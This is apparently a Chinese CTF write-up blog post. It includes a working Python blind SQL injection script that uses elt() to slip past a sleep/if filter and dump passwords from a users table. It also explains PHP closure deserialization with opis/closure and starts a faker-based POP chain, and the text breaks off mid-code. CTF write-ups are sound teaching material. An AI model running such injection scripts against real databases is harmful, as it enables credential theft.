<h2 id="绝对防御"><a href="#绝对防御" class="headerlink" title="绝对防御"></a>绝对防御</h2><p>考点：信息搜集，SQL注入<br>审计前端js可以发现可疑的路径：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670143942001-c8bb6e4b-fda7-48c0-8f85-688798a999fa.png#averageHue=%23fafaf9&clientId=u375e3a07-991b-4&from=paste&height=297&id=u350f3643&name=image.png&originHeight=371&originWidth=1563&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55120&status=done&style=none&taskId=uf7c4c4a8-8123-4062-9aad-87dd21406a5&title=&width=1250.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670143945230-5d93631c-b9fc-4f76-a958-4170e72e57f3.png#averageHue=%23fefdfb&clientId=u375e3a07-991b-4&from=paste&height=54&id=u3a269343&name=image.png&originHeight=68&originWidth=269&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3803&status=done&style=none&taskId=u6cafc822-d321-4c26-ba4d-c2640ca7676&title=&width=215.2" alt="image.png"><br>全局搜索一下<code>ImLib.API_PATH</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670143961659-57c6cdb7-66ca-4f17-b989-970dca77ccfd.png#averageHue=%23fbf7e6&clientId=u375e3a07-991b-4&from=paste&height=63&id=uf86275cf&name=image.png&originHeight=79&originWidth=365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7390&status=done&style=none&taskId=u2d35f9dc-d70c-4336-8a20-47eef4f99ee&title=&width=292" alt="image.png"><br>发现敏感文件，访问之后尝试传参：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670143979569-769b6954-ad6f-46b1-b7ef-4a6bb9745f59.png#averageHue=%23e4ceb1&clientId=u375e3a07-991b-4&from=paste&height=118&id=ub9956506&name=image.png&originHeight=148&originWidth=1163&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9962&status=done&style=none&taskId=u9e6812c3-705e-4b86-aebd-c72b7f0d925&title=&width=930.4" alt="image.png"><br>有回显，经过fuzz发现过滤了<code>sleep,if</code>过滤的很少，可能很多人过滤了if就不知道用什么了，我们可以用elt<br>写个脚本就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author：Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://c204e43e-3219-4b52-af66-45dbca51152c.node4.buuoj.cn:81/SUPPERAPI.php&quot;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &quot;id&quot;: f&quot;1 and elt(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1)#&quot;</span></span><br><span class="line">          <span class="string">&quot;id&quot;</span>:<span class="string">f&quot;1 and elt(ascii(substr((select password from users limit 1,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1)#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data[&quot;id&quot;])</span></span><br><span class="line">        <span class="comment"># print(head)</span></span><br><span class="line">        r=requests.get(url=url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">        res+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#users</span></span><br><span class="line"><span class="comment">#id,username,password,ip,time,USER,CURRENT_CONNECTIONS</span></span><br></pre></td></tr></table></figure>
<p>很难相信这一题也只有16 solves。。自己写出来了，嘻嘻<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670144207332-e50f62ff-0899-4d8b-9bda-dcdc8725f3e7.png#averageHue=%2333312f&clientId=u375e3a07-991b-4&from=paste&height=96&id=u7c64ee79&name=image.png&originHeight=120&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24116&status=done&style=none&taskId=u96307c80-5e51-41d6-b73d-6b2dc67dd3b&title=&width=500.8" alt="image.png"></p>
<h2 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h2><p>考点：新型反序列化,匿名函数闭包反序列化<br>看标题就知道是个新东西，全场0解<br>首先扫描目录会发现源码泄露：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670172400239-327af19f-86ed-46b6-aa23-fb225e70e41b.png#averageHue=%232a3038&clientId=u3d7d0f1d-9525-4&from=paste&height=44&id=u8d97f4ba&name=image.png&originHeight=55&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6013&status=done&style=none&taskId=u6e5aeba0-d044-407e-96e2-e1d38a8d1b5&title=&width=460.8" alt="image.png"><br>重点放在composer.json文件：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  </span><br><span class="line">    <span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;fakerphp/faker&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.19&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;opis/closure&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>首先先介绍一下php的composer，它相当于java的maven，会根据composer.json文件去自动安装依赖，并生成vendor文件夹，里面有一个<code>autoload.php</code>，之后在项目中只需要include这个autoload.php就可以自动包含所有依赖了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670172503869-41c04b0e-9681-48dd-9044-746d2a5973fb.png#averageHue=%23faf8f7&clientId=u3d7d0f1d-9525-4&from=paste&height=315&id=u55fc8645&name=image.png&originHeight=394&originWidth=1056&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31432&status=done&style=none&taskId=u4e0e146d-3aff-4855-ad57-cc948b7c4b0&title=&width=844.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670172516049-2a488f03-9f7c-4a83-87f4-4eb68197e7f8.png#averageHue=%23fbfbfa&clientId=u3d7d0f1d-9525-4&from=paste&height=281&id=u72cc0f15&name=image.png&originHeight=351&originWidth=1046&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31641&status=done&style=none&taskId=u79e395bf-ec84-448b-b107-89280bb27c5&title=&width=836.8" alt="image.png"><br>目录结构如上，基本的介绍完了，就该说明一下那2个包是什么，其中<code>fakerphp/faker</code><br>是用来操作虚假对象的（比如生成随机的用户名，密码，名字，邮箱等信息）,另外一个<br><code>&quot;opis/closure&quot;</code>是用来闭包的，也就是闭包匿名函数</p>
<h3 id="匿名函数（闭包）"><a href="#匿名函数（闭包）" class="headerlink" title="匿名函数（闭包）"></a>匿名函数（闭包）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>**<span class="variable">$a</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>,<span class="number">3</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//int(27)</span></span><br></pre></td></tr></table></figure>
<p>上述例子就是利用call_user_func取调用一个匿名函数（闭包），既然可以调用，那匿名函数可不可以像普通变量一样被序列化呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>**<span class="variable">$a</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>));</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span>: Serialization of <span class="string">&#x27;Closure&#x27;</span> is not allowed in D:\phpstudy_pro\WWW\CTFTOOL\<span class="number">1</span>.php:<span class="number">6</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 D:\phpstudy_pro\WWW\CTFTOOL\1.php(6): serialize()</span></span><br><span class="line"><span class="comment">#1 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p>报错信息如上，可以看到匿名函数实际上也就是一个Closure类，也就是上述我们安装的依赖，所以通常情况下是不可以序列化的，但是当我们调用了Closure依赖后会怎么样呢：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$b</span>**<span class="variable">$b</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = \Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;-----------------------\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;-----------------------\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(\Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;-----------------------\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>),<span class="number">3</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;-----------------------\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(\Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>),<span class="number">3</span>));</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">205</span>) <span class="string">&quot;C:32:&quot;</span>Opis\<span class="built_in">Closure</span>\SerializableClosure<span class="string">&quot;:159:&#123;a:5:&#123;s:3:&quot;</span><span class="keyword">use</span>&quot;;a:<span class="number">0</span>:&#123;&#125;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;function(<span class="subst">$b</span>)&#123;</span></span><br><span class="line"><span class="string">    return <span class="subst">$b</span>**<span class="subst">$b</span>;</span></span><br><span class="line"><span class="string">&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;scope&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;this&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;self&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;0000000031b650db0000000060517cc8&quot;</span>;&#125;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string">object(Opis\Closure\SerializableClosure)#2 (5) &#123;</span></span><br><span class="line"><span class="string">  [&quot;</span>closure<span class="string">&quot;:protected]=&gt;</span></span><br><span class="line"><span class="string">  object(Closure)#5 (1) &#123;</span></span><br><span class="line"><span class="string">    [&quot;</span>parameter<span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">    array(1) &#123;</span></span><br><span class="line"><span class="string">      [&quot;</span><span class="variable">$b</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">      string(10) &quot;</span>&lt;required&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  [&quot;</span>reflector<span class="string">&quot;:protected]=&gt;</span></span><br><span class="line"><span class="string">  NULL</span></span><br><span class="line"><span class="string">  [&quot;</span>code<span class="string">&quot;:protected]=&gt;</span></span><br><span class="line"><span class="string">  string(36) &quot;</span><span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$b</span>**<span class="variable">$b</span>;</span><br><span class="line">&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">  [&quot;</span>reference<span class="string">&quot;:protected]=&gt;</span></span><br><span class="line"><span class="string">  NULL</span></span><br><span class="line"><span class="string">  [&quot;</span>scope<span class="string">&quot;:protected]=&gt;</span></span><br><span class="line"><span class="string">  NULL</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string">object(Closure)#7 (1) &#123;</span></span><br><span class="line"><span class="string">  [&quot;</span>parameter<span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  array(1) &#123;</span></span><br><span class="line"><span class="string">    [&quot;</span><span class="variable">$b</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">    string(10) &quot;</span>&lt;required&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string">int(27)</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string">int(27)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>从上面的例子可以看到引入了依赖后闭包是可以被序列化的，并且序列化的结果可以由Closure类的unserialize和普通的unserialize方法去反序列化，并且都可以成功的回调<br>观察用2种不同的unserialize返回的结果可以发现，Closure下的unserialize返回的是一个<code>Closure</code>对象，而通用的unserialize返回的是<code>Opis\Closure\SerializableClosure</code>对象，有一点区别，不过无论结果如何都可以callback</p>
<h3 id="POP构造"><a href="#POP构造" class="headerlink" title="POP构造"></a>POP构造</h3><p>题目中只给了一个User类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;instance = <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_password = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_username = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; User em9rZWVmZQ== has created.</span><br></pre></td></tr></table></figure>
<p>审计下来可以发现有用的也就只有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这两个方法而已，但是如何构造pop呢？我们别忘了还有一个faker依赖：<br>审计一下<code>\faker\Generator</code>类，里面有几个重要方法我罗列出来：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$formatters</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">trigger_deprecation</span>(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$format</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>] = [<span class="variable language_">$this</span>, <span class="variable">$format</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// &quot;Faker\Core\Barcode-&gt;ean13&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ 